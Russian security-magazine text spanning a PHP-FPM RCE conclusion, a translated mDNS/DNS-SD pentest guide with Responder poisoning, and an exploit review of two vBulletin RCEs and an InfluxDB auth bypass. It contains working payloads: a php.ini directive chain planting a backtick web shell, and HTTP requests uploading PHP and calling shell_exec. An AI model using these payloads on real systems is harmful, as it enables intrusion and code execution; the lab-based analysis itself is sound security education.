1750 букв А здесь снова опу щены. Отправляем и наблюдаем в ответе хидер
Set‐Cookie, а значит, пейлоад отработал успешно.





                   Успешная эксплуата ция PHP‐FPM

Эта опция действительна, пока работает воркер PHP‐FPM, который был про‐
эксплуатирован.
   Теперь осталось найти цепочку гад жетов из нас троек PHP, которые будут
давать выполнение кода. Вот что предлага ют авторы эксплоита:


attack.go
var chain = []string{
  "short_open_tag=1",
  "html_errors=0",
  "include_path=/tmp",
  "auto_prepend_file=a",
  "log_errors=1",
  "error_reporting=2",
  "error_log=/tmp/a",
  "extension_dir=\"<?=`\"",
  "extension=\"$_GET[a]`?>\"",
}

 • short_open_tag=1 — вклю чает короткую форму записи PHP‐тегов;
 • include_path=/tmp — ука зывает директорию /tmp, в которой PHP
   будет искать файлы;
 • auto_prepend_file=a — файл с именем а будет автоматически обра‐
   батываться перед вызовом любого скрипта;
 • log_errors=1 — вклю чает логирование оши бок;
 • error_reporting=2 —  включает  уровень  логирования  ошибок
    (E_WARNING);
 • error_log=1 — ошибки будут также логировать ся в файл a ;
 • extension_dir=\"<?=`\" — ука зывает тег <?=` в качестве дирек‐
   тории, в которой необ ходимо искать расширения;
 • extension=\"$_GET[a]`?>\" — ука зывает $_GET[a]`?> в качестве
  имени загружаемого расширения.

После того как все директивы будут установлены, PHP создаст во временной
директории /tmp файл a. В него попадет ошиб ка такого вида:


<?=`$_GET[a]`?>

То есть это веб‐шелл через бэктики. Разумеется, каждую директиву нужно
отправлять отдельным запросом. В итоге мы имеем удаленное выпол нение
команд.





            Удален ное выполнение команд в PHP‐FPM 7.3.10

Оригинальный экспло ит, написанный Эмилем, ты можешь скачать на гитхабе.


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ЗАКЛЮЧЕНИЕ
Сегодня я разобрал одну из самых интересных за пос леднее время уяз‐
вимостей. Здесь прекрасно все: от обнаружения до написания пол ноценного
эксплоита с критическим импактом. Это отличный пример того, как прев‐
ратить аномалию в полноценно работа ющий вектор атаки. Для этого нужно
понимать механизм работы исследуемо го приложения и усердно ресерчить.
  Найденная уязвимость в очередной раз доказывает, что даже в таких круп‐
ных продуктах, как PHP, еще полно необ наруженных уязвимостей.
   Хотя здесь и имеется определенный список начальных условий, не стоит
думать, что их не бывает в дикой природе. Совсем наоборот. Nginx — штука
гибкая, и существует огромное количество заведомо уяз вимых конфигов.
Плюс ко всему разработ чики любят копировать готовые нас тройки друг у дру‐
га, не проводя даже минимальный их ана лиз. Это тоже не прибавляет
безопасности.
  К слову, дефол тный кон фиг Ubuntu 18.04 от падения в пучину RCE отде‐
ляет всего одна строка — try_files $fastcgi_script_name =404;.





        Дефол тный конфиг fastcgi.conf для nginx в Ubuntu 18.04

Если ее убрать, то получаем уяз вимую среду. А это не такой уж и редкий слу‐
чай. Представь, что nginx и PHP‐FPM находятся на разных машинах. Такая
схема довольно часто встречает ся в про дакшене.
   Есть еще несколько конфигура ций, когда в fastcgi_split_path_info
используется более жесткое регулярное выражение, но эксплу атация все
еще возможна. Советую посмотреть пулл‐реквест самого Эмиля. Если
хочешь еще глубже копнуть в этом направлении, то начни с разбора уяз‐
вимости, которую нашел Оранж Цай. У него тоже есть нес колько допол‐
нительных способов оптимизировать экс плоит.
   Что касается патча, то разработчики доволь но быстро отре агировали
на инцидент и залатали брешь. Но дистри бутивы PHP не так часто обновля‐
ются на серверах, поэто му в ближайшее время будет еще множество потен‐
циально уязвимых продуктов. Так что не зевай, следи за обновлениями дис‐
трибутивов и сво евременно накатывай пат чи! Особенно те, которые повыша‐
ют безопасность.
ВЗЛОМ

 ИГРА
 НА ДОВЕРИИ
      ПЕНТЕСТИМ MULTICAST DNS
        И SERVICE DISCOVERY





Multicast DNS (mDNS) и Service Discovery
(DNS‐SD) — это повсеместно распростра‐
ненные протоколы, их сейчас по дефолту
включают во многие технические продукты,
особенно  предназначенные  для  дома           Mark Haase
или маленькой офисной сети. В этой статье
я разберу, что пентестеру следует знать
о mDNS и DNS‐SD и как можно исполь‐
зовать  эти  технологии для собственных
целей.


             INFO

                      Это перевод статьи Марка Э. Хааса, впервые
                       опубликован ной в блоге Hyperion Gray. Перевела
                      Алёна Георгиева.



ЧТО ТАКОЕ MDNS?
Официальные сайты Multicast DNS и DNS Service Discovery способны скорее
запутать, чем пролить свет на суть этих технологий. Поэтому — прежде чем
погружаться в вопросы безопасности mDNS и DNS‐SD — мы обсудим,
почему вообще эти протоколы существу ют и чем они на самом деле занима‐
ются.
  Оба протокола являются частью Zeroconf — пакета технологий, который
помогает сетевым устройствам находить друг дру га автоматически. Когда ты
отправляешь документ на печать, а твой компьютер сам предлагает на выбор
ближайшие принтеры, скорее всего, он исполь зует именно Zeroconf. Про‐
токолы связаны с DNS, так что здесь нуж но хотя бы на базовом уровне
понимать, как устроена система DNS.
  Обычно DNS работает «одноадресно» (unicast) — это значит, что каждый
запрос отправляется на конкретный IP‐адрес. Сло во multicast (то есть «мно‐
гоадресность») в mDNS означает, что запрос веерно рассылается всем
девайсам широковещательного домена (broadcast domain). Сам по себе тер‐
мин  «широковещательный домен»  озна чает,  гру бо  говоря,  все  сооб‐
щающиеся устрой ства второго уровня — например, компьюте ры, соединен‐
ные сетевыми коммутаторами. Это важный момент, ведь запросы mDNS
не проходят через роутеры — потому что роутеры уже устрой ства третьего
уровня.
   Разберемся на примере. Мой MacBook Pro имеет в системе mDNS имя
MehBook.local. Выяснить это мож но во вкладке «Общий дос туп» (Sharing)
системных настроек.





Чтобы вычислить IP макбука, мы можем использовать инс трумент DNS‐зап‐
росов вроде dig:



  $ dig @224.0.0.251 ‐p 5353 +short MehBook.local
  10.105.0.203


Обрати внимание, что имя заканчивается на .local — это домен верхне го
уровня, зарезер вированный специально под mDNS. Если ты видишь подоб‐
ное имя — то, вероятно, сможешь вычислить айпишник, используя mDNS.
Такие доменные имена называются именами локальной связи  (link‐local
names), потому что увидеть их можно только внутри локальной сети.


             INFO

                    Имей в виду: некоторые сисадмины некорректно
                       используют  местный  домен  верхнего  уровня
                      вместе с одно адресным DNS. Следи за собой,
                       будь осторожен!


Вместо того чтобы посылать запрос DNS‐серверу на порт 53, мы используем
порт 5353 и специальный адрес 224.0.0.251 — собс твенно, мультикас‐
томный. Этот конкретный адрес зарезервирован специально для mDNS. Ког‐
да на адрес 224.0.0.251 приходит запрос, все устройства сети получают
копию этого запроса и могут на него ответить. В нашем примере мой макбук
увидел запрос и вернул по нему свой собственный айпишник — 10.105.0.
203.
   IP моего макбука динамический, через какое‐то время он поменя ется —
а вот mDNS‐имя останется прежним! Так что мы можем взаимодействовать
с доменными именами без запуска DNS‐сервера. Сам понимаешь, чем
это полезно в домашних и небольших офисных сетях.


ЧТО ТАКОЕ DNS-SD?
В примере с mDNS мы выяс няли айпишник устройства с уже извес тным име‐
нем. Но что, если ты хочешь свя заться с девайсом, имя которого не зна‐
ешь, — например, с прин тером? Эту проб лему как раз и решает протокол
обнаружения сер висов (Service Discovery). Он поз воляет устройствам заяв‐
лять о конкретных сервисах, которые они предлага ют, — так, чтобы можно
было обнаружить их без централизованной настройки.
   Начнем с вычисления принтеров:



  $ dig @224.0.0.251 ‐p 5353 ‐t ptr +short _printer._tcp.local
  Brother\032DCP‐L2540DW\032series._printer._tcp.local.


Тут нам помогут те же мультикастомный DNS‐адрес и порт, но на сей раз мы
запрашиваем PTR‐записи и используем специаль ное доменное имя _print‐
er._tcp.local — оно как раз предназначено для распознавания принтеров.
В ответ на этот запрос мой принтер Brother вернул свое локальное доменное
имя.
   Если ты хочешь запросить устройства с другими сервисами, то стоит све‐
риться с их официальным реес тром. Например, там есть любопытная служба
RAOP — она же протокол Apple, известный как AirTunes. Давай‐ка его вычис‐
лим:


$ dig @224.0.0.251 ‐p 5353 ‐t ptr +short _raop._tcp.local
C8D083XXXXXX\@Living\032Room._raop._tcp.local

Запрос показывает устройство в моей сети, предлагающее сервис RAOP, —
это Apple TV под названием «Гостиная» (Living Room). На самом деле в моей
сети два Apple  TV, но dig выводит только первый полученный  ответ.
К счастью, есть инструменты и получше. На macOS это команда dns‐sd
в  программном  модуле  Rendezvous  (Bonjour),  эппловской  реализации
Zeroconf.



  $ dns‐sd ‐B _raop._tcp
  Browsing for _raop._tcp
  DATE: ‐‐‐Sun 16 Sep 2018‐‐‐
  10:02:18.236  ...STARTING...
  Timestamp      Domain  Service Type   Instance Name
  10:02:18.237   local.  _raop._tcp.    D0D2B0XXXXXX@Bedroom
  10:02:18.238   local.  _raop._tcp.    C8D083XXXXXX@Living Room
  ^C


Эта команда разошлет зап рос и отоб разит все полученные ответы (чтобы
избавиться от них, нужно будет нажать Ctrl‐C). Теперь мы видим оба моих
Apple TV.
  На  Linux  тот же  набор  инстру ментов  предлагает  пакет  Avahi  (на
Debian/Ubuntu он называется avahi‐utils).



  $ avahi‐browse _raop._tcp
  + IPv6 D0D2B0XXXXXX@Bedroom      AirTunes Remote Audio local
  + IPv6 C8D083XXXXXX@Living Room  AirTunes Remote Audio local
  + IPv4 D0D2B0XXXXXX@Bedroom      AirTunes Remote Audio local
  + IPv4 C8D083XXXXXX@Living Room  AirTunes Remote Audio local
  ^C


Avahi умеет переводить имена служб типа _raop._tcp.local в более понят‐
ные — AirTunes Remote Audio local, например. Также Avahi может вычис‐
лить айпишник с помощью mDNS, так что dig здесь вообще не нужен:


$ avahi‐resolve ‐‐name Bedroom.local
Bedroom.local   10.105.0.230


             INFO

                   Обрати внимание, что при mDNS‐запросе мы
                      не  вставляем значения  типа _raop._tcp —
                       потому что это название службы, а не устройства.
                        Также мы ничего не пишем слева от символа @.



ВЫЧИСЛЯЕМ УСТРОЙСТВА
Теперь ты видишь, чем пакет Zeroconf интересен пентестерам: благодаря ему
можно быстро найти целый список доступных устройств буквально за пару
запросов. А Avahi еще и позволяет автоматизиро вать этот процесс. Нап‐
ример, вполне реально упа ковать обнаружение сервисов и пробивание IP
через mDNS в один шаг.



  $ avahi‐browse ‐‐resolve _printer._tcp
  + enp4s0 IPv4 Brother DCP‐L2540DW series  UNIX Printer  local
  = enp4s0 IPv4 Brother DCP‐L2540DW series  UNIX Printer  local
     hostname = [brotherB85F3190.local]
     address = [10.105.0.3]
     port = [515]
     txt = ["UUID=e3248000‐XXXX‐XXXX‐XXXX‐XXXXXXXXXXXX"
         "TBCP=F" "Transparent=T" "Binary=T" "PaperCustom=T"
         "Scan=T" "Fax=F" "Duplex=T" "Copies=T" "Color=F" …]
  ^C


В результате мы получа ем локальное имя хос та, IP‐адрес и порт (tcp/515 —
дефолтный порт для Line Printer Daemon). Плюс много информации о воз‐
можностях прин тера в поле txt.
  Использованная здесь команда — отличный способ пересчитать все
устройства конкретного типа, однако Avahi спо собен на большее! Сле дующая
команда вычисляет вообще все типы сервисов сра зу.



  $ avahi‐browse ‐‐all
  + IPv6 8FB20F14F5966F78620XXXX    iPod Touch Music Library local
  + IPv6 276A1455BC533567B08XXXX    iPod Touch Music Library local
  + IPv4 8FB20F14F5966F78620XXXX    iPod Touch Music Library local
  + IPv4 276A1455BC533567B08XXXX    iPod Touch Music Library local
  + IPv6 8FB20F14F5966F78620XXXX    _appletv‐v2._tcp     local
  + IPv6 276A1455BC533567B08XXXX    _appletv‐v2._tcp     local
  + IPv4 8FB20F14F5966F78620XXXX    _appletv‐v2._tcp     local
  + IPv4 276A1455BC533567B08XXXX    _appletv‐v2._tcp     local
  ^C


Наконец, Avahi может слушать запросы по протоко лам Zeroconf от дру гих
устройств, что позволя ет вычислять девайсы фоново.



  $ avahi‐browse ‐a
  + IPv6 MehBook            _companion‐link._tcp local
  + IPv6 Bedroom            _companion‐link._tcp local
  + IPv6 Living Room        _companion‐link._tcp local
  + IPv4 MehBook            _companion‐link._tcp local
  ^C


Обе эти команды можно сочетать с ‐‐resolve, чтобы получить информацию
об айпишниках и портах каж дого девайса. Все устройства сети как на ладони!
  И конечно, нельзя не упомянуть, что Nmap поддерживает вычисление
устройств Zeroconf с помощью скрипта broadcast‐dns‐service‐discovery.



  $ nmap ‐‐script=broadcast‐dns‐service‐discovery
  Starting Nmap 7.60 ( https://nmap.org ) at 2018‐09‐18 11:40 EDT
  Stats: 0:00:03 elapsed; 0 hosts completed (0 up)
  NSE Timing: About 0.00% done
  Pre‐scan script results:
  | broadcast‐dns‐service‐discovery:
  |   224.0.0.251
  |     80/tcp privet
  |       txtvers=1
  |       ty=Brother DCP‐L2540DW series [ACD1B8XXXXX]
  |       note=Brother DCP‐L2540DW series
  |       url=https://www.google.com/cloudprint
  |       type=printer
  |       id=10d70d78‐XXXX‐XXXX‐XXXX‐XXXXXXXXXXXX
  |       cs=online
  |       Address=10.105.0.3
  …snip…


Этот скрипт не включен в категорию default — его можно найти только
в safe.


Нем ного об огра ниче ниях
 • Это работает толь ко внутри локальной сети, так что нужно иметь к ней дос‐
   туп.
 • Большие корпоративные сети обычно сегментированы, поэтому потребу‐
   ется опорная точка именно внутри интересу ющего тебя сегмента.
 • Есть много важных служб, которые не заявляют о себе через DNS‐SD, —
   такие устройства в большинстве случаев придет ся вычислять как‐то иначе.
 • Из‐за того, что это широковещательные протоколы, нужно хорошенько
   подумать — позволяют ли твоя тактика и стратегия их использовать?




ЭКСПЛУАТАЦИЯ
Окей, вычисление устройств — это при кольно и все такое, но есть ли здесь
что поэксплуатировать? Мы нашли связку прин теров и Apple TV — и?..
   Во‐первых, держи в уме, что продукты для домашней и небольшой офис‐
ной сети, использующие Zeroconf, с высокой веро ятностью имеют неправиль‐
ные настройки и уязвимости. Один простой пример: если принтер аутен‐
тифицируется через LDAP‐сервер, а у того стоит дефол тный пароль произво‐
дителя, ты можешь захватить контроль над сервером, заставить принтер
к нему обратиться и таким обра зом украсть LDAP‐аттестат принтера. Этим
способом можно довольно быстро угнать доменный аккаунт!


        WWW

                   Об угоне прин тера с помощью LDAP‐сервера
                         есть отличный пост на GrimBlog.


Во‐вторых, в плане безопасности Zeroconf похож на ARP: подразумевается,
что  локальная  сеть — доверенная.  Как мы  уже  убе дились,  Zeroconf
не заботится о конфиденциальнос ти: мы можем фоново прослушивать внутри
сети все запросы типа DNS‐SD. Аутентификации в Zeroconf тоже нет: любое
устройство в сети может отоз ваться на зап рос типа mDNS или DNS‐SD. Сле‐
довательно, зло умышленник может, например, отвечать на запросы с опечат‐
ками в именах (реальный домен такое просто про игнорирует). А если запрос
составлен корректно — попытаться обогнать ответ реального устройства
и предложить службы, которых на самом деле не существует.
   Если ты еще не знаком с Responder, то самое время познакомиться:
это фантастический инструмент для спуфин га (отравления кеша) локальных
сетей. Кроме mDNS, он умеет отправлять NetBIOS и LLMNR, что делает его
идеальным орудием пентеста.


        WWW

                Мы  сейчас  рассмотрим  небольшой  пример
                        с использованием Responder, но, если тебе нуж‐
                      но больше деталей, советую пост на 4ARMED.


Запускаю Responder на машине, с которой буду ата ковать.





Responder ждет, пока какое‐нибудь устрой ство в сети сделает запрос. Этот
запрос я делаю с машины‐жертвы: пытаюсь запросить айпишник своего мак‐
бука, но «случайно» опечатываюсь.



  ~ $ dns‐sd ‐G v4 MehBok.local
  DATE: ‐‐‐Tue 18 Sep 2018‐‐‐
  12:18:31.228  ...STARTING...
  Timestamp     A/R Flags if Hostname        Address     TTL
  12:18:31.229  Add     2 5 MehBok.local.   10.105.0.2 120


Заметь: несмотря на опечатку в имени хос та, ответ я получаю. Логи Respon‐
der показывают, что это он ответил — и перенап равил жертву на атакующую
машину.



  [*] [MDNS] Poisoned answer sent to 10.105.0.203    for name MehBok.local


А если жертва отправляет реальное и корректно написанное имя? В таком
случае Responder пытается обогнать зап рошенное устройство и ответить
на запрос раньше. Вот, нап ример, я пробиваю имя моего принтера.



  ~ $ dns‐sd ‐G v4 brotherB85F3190.local
  DATE: ‐‐‐Tue 18 Sep 2018‐‐‐
  12:27:50.695  ...STARTING...
  Timestamp     Hostname                 Address      TTL
  12:27:50.696  brotherB85F3190.local.   10.105.0.3 240
  12:27:51.916  brotherB85F3190.local.   10.105.0.2 120


Первый результат — ответ реального прин тера. Второй, пришедший почти
на 1,2 секунды позже, — отравленный ответ от Responder. Большинство кли‐
ентов принимают только первый ответ и игнориру ют все последующие, так
что в нашем конкретном случае Responder не преуспел.


ЗАКЛЮЧЕНИЕ
Вообще Zeroconf — отличная и дос тупная тех нология. Скорее всего, ты уже
используешь ее дома или на работе, даже если не отдаешь себе в этом
отчет. Ну а пентестеры могут использовать Zeroconf для тихого или даже
фонового вычисления устройств. В то время как сканирование через Nmap
генерит кучу трафика и очень характерных при мет, вычисление через Zeroconf
занимает  совсем  мало  трафика  и  походит  на  нормальную  сетевую
активность. К тому же отравление mDNS с помощью Responder — куда более
надежный способ реализовать ата ку пос редника, чем то же отравление ARP.
ВЗЛОМ


                   КРИТИЧЕСКИЕ БАГИ
                В VBULLETIN, INFLUXDB
                       И DJANGO





                                                                                       aLLy
                                                                                   ONsec
                                                                                                @iamsecurity
      ОБЗОР
 ЭКСПЛОИТОВ




Сегодня мы поговорим сразу о нескольких уязвимостях.
Одна из них была найдена в популярном форум ном движке
vBulletin и позволяет ата кующему выполнять произвольный
код, не имея никаких прав, — от такого безоб разия его отде‐
ляет лишь один POST‐запрос. Также я потреплю старичка
Django в поис ках SQL‐инъекций и покажу, как работает
обход авторизации в базе дан ных InﬂuxDB.


2019 год подходит к концу, все начина ют уси ленно готовиться к праздни кам.
Безопасники добивают свои пос ледние аудиты, которые из года в год
наваливаются в эту пору. Неудивитель но — ведь фискальный год тоже под‐
ходит к концу, а бюджеты еще не до конца пот рачены!
  После таких плодотворных недель кругом начина ется затишье, и это каса‐
ется в том числе информа ционной безопасности. Не так много уязвимостей
и активностей приходит ся на конец декабря и начало января. Поэтому сейчас
самое время вспомнить баги, которые, воз можно, остались незаме ченными
в течение года.
  Они просты по своей сути, однако это не меша ет им иметь критический
статус. Одни дают возможность выполнить про извольный код, другие —
получить доступ к чувствитель ным данным или вовсе захватить полный доступ
к системе. В этом году сильно дос талось коммерчес кому форумному движку
vBulletin: сразу несколько опасных багов было найдено в последних его вер‐
сиях во второй половине года. С них и начнем.


RCE ЧЕРЕЗ ЗАГРУЗКУ АВАТАРА В VBULLETIN
Автор: Эджидио Романо (Egidio Romano aka EgiX)
Дата релиза: 4.10.2019
CVE: CVE‐2019‐17132
Уяз вимые версии: vBulletin <= 5.5.4
   Чтобы более предметно раз говаривать о найденной проблеме, нужно
поднять стенд и посмотреть на нее поб лиже. Так как vBulletin — коммерчес‐
кое приложение, я предлагаю тебе самостоятель но решить, каким образом
его найти.
  В качестве базы данных будем использовать MySQL, а в качес тве веб‐сер‐
вера — докер‐кон тейнер на основе Debian.


docker run ‐d ‐e MYSQL_USER="vb" ‐e MYSQL_PASSWORD="EAQhaTXieg" ‐e
MYSQL_DATABASE="vb" ‐‐rm ‐‐name=mysql ‐‐hostname=mysql mysql/
mysql‐server:5.7
docker run ‐‐rm ‐ti ‐‐link=mysql ‐‐name=websrv ‐‐hostname=websrv ‐p80
:80 debian /bin/bash

Устанавливаем стандартный набор из Apache2 и PHP.


apt update && apt install ‐y apache2 php nano php‐mysqli php‐xml
php‐gd

После этого можно запускать веб‐сервер.


service apache2 start

Теперь устанавливаем vBulletin, я буду использовать версию 5.4.3.





                    Ус тановка vBulletin версии 5.4.3

По дефолту загруженные файлы хра нятся в базе данных, такое поведение
совместимо с эксплуата цией уязвимос ти. Поэтому сначала нужно зайти
в настройки и поменять место хра нения ава таров.





  Меняем место хранения загруженных аватаров пользователей в vBulletin

Загружается аватар через отправку зап роса POST на /profile/upload‐pro‐
filepicture.


POST /profile/upload‐profilepicture HTTP/1.1
Host: web.fh
Connection: keep‐alive
Accept: application/json, text/javascript, */*; q=0.01
X‐Requested‐With: XMLHttpRequest
Content‐Type: multipart/form‐data; boundary=‐‐‐‐WebKitFormBound
ary2V36WCZNIGxAuYwu
Cookie: сессионные_куки_


‐‐‐WebKitFormBoundary2V36WCZNIGxAuYwu
Content‐Disposition: form‐data; name="profilePhotoFile";
filename="orange_box.png"
Content‐Type: image/png


содержимое_файла
‐‐‐WebKitFormBoundary2V36WCZNIGxAuYwu
Content‐Disposition: form‐data; name="securitytoken"


CSRF‐токен
‐‐‐WebKitFormBoundary2V36WCZNIGxAuYwu‐‐

Если здесь просто попытаться загрузить PHP‐файл, то ничего не выйдет. Рас‐
ширение файла определяется библиотекой, которая работает с картинками.
Если переданный документ не будет картинкой, то скрипт просто прекратит
свою работу с ошибкой not_an_image.


core/vb/library/user.php
1335:   public function uploadAvatar($filename, $crop = array(),
$userid = false, $adminoverride = false)
1336:   {
...
1339:       $isImage = $imageHandler‐>fileLocationIsImage($filename);
1340:       if ($isImage)
1341:       {
...
1359:           $fileInfo = $imageHandler‐>fetchImageInfo($filename);
...
1361:       else
1362:       {
1363:           // throw something useful here.
1364:           throw new vB_Exception_Api('not_an_image');
1365:       }
...
1435:       $ext = strtolower($fileInfo[2]);
1436:
1437:       $dimensions['extension'] = empty($ext) ? $pathinfo[
'extension'] : $ext;
...
1485:                   'extension' => $dimensions['extension'],
...
1511:       $result = $api‐>updateAvatar($userid, false, $filearray,
true);

После всех манипуляций вызывается updateAvatar с параметрами аватара
в $filearray.
  Однако существует возможность напрямую вызвать этот метод API. Чтобы
это сделать, нужно отправить запрос на эндпойнт ajax/api/user/updateA‐
vatar. Если заглянуть в тело метода updateAvatar, то можно обнаружить
любопытный участок кода.


core/vb/api/user.php
4111:   public function updateAvatar($userid, $avatarid, $data =
array(), $cropped = false)
4112:   {
...
4149:       if ($useavatar)
4150:       {
4151:           if (!$avatarid)
4152:           {
...
4166:               if (empty($data['extension']))
4167:               {
4168:                   $filebits = explode('.', $data['filename']);
4169:                   $data['extension'] = end($filebits);
4170:               }
4171:
4172:               $userpic‐>set('extension', $data['extension']);
...
4182:                   $avatarfilename = "avatar{$userid}_{$avatar
revision}.{$data['extension']}";
...
4186:                   $avatarres = @fopen("$avatarpath/$avatar
filename", 'wb');
...
4187:                   $userpic‐>set('filename', $avatarfilename);
4188:                   fwrite($avatarres, $data['filedata']);
4189:                   @fclose($avatarres);

Здесь расширение берется из мас сива $data, который можно просто
передать в теле запроса. Оно будет иметь следующий вид:


userid=0&avatarid=0&data[extension]=<расширение_файла>&data[filedata]
=<содержимое_файла>&securitytoken=<токен>

Когда userid установлен в ноль, скрипт выбирает текуще го авторизованного
пользователя, а avatarid, равный нулю, говорит, что нужно загружать аватар,
а не удалять.
   Вот мы и подоб рались к самой сути уяз вимости. vBulletin не проверят дол‐
жным образом параметры data[extension] и data[fildeata], и это поз‐
воляет творить чудесные вещи. Например, установим расширение php, а в
data[filedata] передадим прос той PHP‐код.


POST /ajax/api/user/updateAvatar HTTP/1.1
Host: web.fh
Content‐Length: 65
Accept: application/json, text/javascript, */*; q=0.01
X‐Requested‐With: XMLHttpRequest
Content‐Type: application/x‐www‐form‐urlencoded; charset=UTF‐8
Cookie: PHPSESSID=355lckvqh94p8sj61v7a4rvkvq; np_notices_displayed=;
lastvisit=1576635268; lastactivity=1576672162; sessionhash=d3c263
fa681b0b7cf8be74eab13aee6a


userid=0&avatarid=0&data[extension]=php&data[filedata]=<?php
phpinfo(); ?>&securitytoken=1576672162‐20c4434e90101a08780f3e04
47410b20c03dc8a4





  Загрузка PHP‐скрипта как аватара через метод API
  /ajax/api/user/updateAvatar

Если сервер вернул true, то дело в шляпе, PHP‐скрипт был создан. Чтобы
узнать путь до него, нужно определить текущий avatarrevision. Это можно
сделать, просто загрузив следом валидную картинку. Сервер вернет путь
до файла вида


{"hascustom":1,"avatarpath":"customavatars\/avatar2_36.png"}

Число после подчеркивания и будет текущей ревизи ей. Значит, пре дыду щая
была на единицу меньше, так как она автомати чес ки инкре ментируется с каж‐
дой загрузкой. В моем случае это 35, а значит, путь до скрипта будет таким:


http://web.fh/core/customavatars/avatar2_35.php

Переходим по нему и видим информа цию из phpinfo().





   Успешная эксплуатация vBulletin. Выполнение про извольного PHP‐кода

Конечно же, существует экспло ит, который автоматизирует все действия
и предоставляет интерфейс для выполнения команд в виде шел ла. Нужно
лишь указать логин и пароль пользователя форума.





                    Эксплуата ция RCE в vBulletin


RCE ЧЕРЕЗ ВИДЖЕТ В VBULLETIN
Автор: неизвестен
Дата релиза: 24.9.2019
CVE: CVE‐2019‐16759
Уяз вимые версии: vBulletin 5.0.0–5.5.4
   Вторая уязвимость в vBulletin еще проще, но при этом гораздо опаснее.
Все потому, что эксплуата ция не требует вооб ще никаких привилегий от ата‐
кующего.
  В vBulletin, как и во всех современных CMS, существу ет сис тема виджетов.
Это небольшие кусоч ки кода, часто динамические, которые можно исполь‐
зовать при формировании контента на сайте. Один из таких вид жетов — PHP.
Как понятно из названия, он позволяет выполнять произвольный PHP‐код
и выводить его результаты на сайт.





                       PHP‐виджет в vBulletin

Замечательная вещь, вот только дос тупна она не одним админис траторам,
а любому пользователю, который отправит верный запрос к ajax/render/
widget_php.
  Все виджеты инициализиру ются при установке  vBulletin. Информация
о шаблонах и непосредс твенно самих виджетах записы вается в таблицы tem‐
plate и widget базы данных. Вот так выглядит интересующий нас wid‐
get_php.





                     Запись в таблице widget





          Шаблон виджета widget_php в таб лице template

Содержимое шаблона формируется при парсинге XML‐файла во время уста‐
новки vBulletin.


core/install/vbulletin-widgets.xml
1114:   <widget guid="vbulletin‐widget_15‐4eb423cfd6bd63.20171439">
1115:       <parentguid>vbulletin‐abstractwidget‐global</parentguid>
1116:       <template>widget_php</template>
1117:       <icon>module‐icon‐php.png</icon>
1118:       <isthirdparty>0</isthirdparty>
1119:       <category>Generic</category>
...
1143:           <definition>
1144:               <name>code</name>
1145:               <field>LongText</field>
...
1153:       </definitions>
1154:   </widget>


core/install/vbulletin-style.xml
65182:      <template name="widget_php" templatetype="template" date=
"1452807873" username="vBulletin Solutions" version="5.2.1 Alpha 2"><
![CDATA[<vb:if condition="empty($widgetConfig) AND !empty($widget
instanceid)">
...
65190: <div class="b‐module{vb:var widgetConfig.show_at_breakpo
ints_css_classes} canvas‐widget default‐widget custom‐html‐widget"
id="widget_{vb:raw widgetinstanceid}" data‐widget‐id="{vb:raw
widgetid}" data‐widget‐instance‐id="{vb:raw widgetinstanceid}">
65191:
65192:  {vb:template module_title,
65193:      widgetConfig={vb:raw widgetConfig},
65194:      show_title_divider=1,
65195:      can_use_sitebuilder={vb:raw user.can_use_sitebuilder}}
65196:
65197:  <div class="widget‐content">
65198:      <vb:if condition="!empty($widgetConfig['code']) AND
!$vboptions['disable_php_rendering']">
65199:          {vb:action evaledPHP, bbcode, evalCode, {vb:raw
widgetConfig.code}}
65200:          {vb:raw $evaledPHP}
65201:      <vb:else />
...
65207: </div>]]></template>

Обрати внимание на строки 65 198–65 200. Если параметр code не пустой и в
настройках vBulletin не отключено выполнение PHP‐кода (а по дефолту имен‐
но так оно и есть), то вызывается функция evalCode.


includes/vb5/frontend/controller/bbcode.php
213:    function evalCode($code)
214:    {
215:        ob_start();
216:        eval($code);
217:        $output = ob_get_contents();
218:        ob_end_clean();
219:        return $output;
220:    }

Эта функция выпол няет переданный ей код на PHP и возвращает результат.
Все, что нужно, чтобы проэксплуати ровать уязвимость, — это передать
на эндпойнт ajax/render/widget_php необ ходимые конструкции в widget‐
Config['code'].


POST /ajax/render/widget_php HTTP/1.1
Host: web.fh
Content‐Length: 65
Content‐Type: application/x‐www‐form‐urlencoded; charset=UTF‐8


widgetConfig[code]=echo shell_exec('uname ‐a; id; whoami');exit;





       Выполнение произволь ного кода в vBulletin через виджет

В ответе сервера получаем результат выполненных команд.
   Это настолько нелепо, что сильно напоминает обычный бэкдор, который
не очень‐то и пытались скрыть. Либо это досаднейший недосмотр раз работ‐
чиков. В продуктах такого калиб ра, как  vBulletin, подобного происходить
не должно.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
  ОБЗОР ЭКСПЛОИТОВ
           КРИТИЧЕСКИЕ БАГИ В VBULLETIN, INFLUXDB
                                И DJANGO





ОБХОД АУТЕНТИФИКАЦИИ В INFLUXDB
Автор: неизвестен
Дата релиза: 27.3.2019
CVE: нет
Уяз вимые версии: все версии всех основных веток (1.6, 1.7, 1.8), выпущен‐
ные до 2 апреля 2019 года
  Давай немного отдохнем от PHP и переключимся на что‐нибудь другое.
На очереди база данных InﬂuxDB.
   Это кросс‐платформенное опенсорсное решение для хранения времен‐
ных рядов, так называемая time series database (TSDB). Она пол ностью
написана на языке Go, не требует внешних зависи мостей и чаще все го
используется для хранения больших объемов данных с метками времени.
Это, например, данные мониторинга, метрики приложе ний и показатели дат‐
чиков IoT.
  Синтаксис запросов InﬂuxDB чем‐то похож на SQL. В целом это не такой
уж и редкий гость в кор поративной среде, мне частенько попадаются инстан‐
сы во время аудитов.
  Для начала запустим докер‐контейнер с уязвимой версией БД. При этом я
сразу указываю администра тора и его пароль.


docker run ‐‐rm ‐d ‐p8086:8086 ‐e INFLUXDB_HTTP_AUTH_ENABLED=true ‐e
INFLUXDB_ADMIN_USER=admin ‐e INFLUXDB_ADMIN_PASSWORD=admin ‐e INFLUX
DB_DB=sample influxdb:1.7.5

По дефолту интерфейс доступен на порте 8086.
  База данных поддерживает аутентификацию при помощи токенов JWT.
Заглянем в сорцы.


influxdb-1.7.5/services/httpd/handler.go
1553: func authenticate(inner func(http.ResponseWriter, *http.Request
, meta.User), h *Handler, requireAuthentication bool) http.Handler {
1554:   return http.HandlerFunc(func(w http.ResponseWriter, r *http.
Request) {
...
1585:           case BearerAuthentication:
1586:               keyLookupFn := func(token *jwt.Token) (interface
{}, error) {
1587:                   // Check for expected signing method.
1588:                   if _, ok := token.Method.(*jwt.Signin
gMethodHMAC); !ok {
1589:                       return nil, fmt.Errorf("unexpected
signing method: %v", token.Header["alg"])
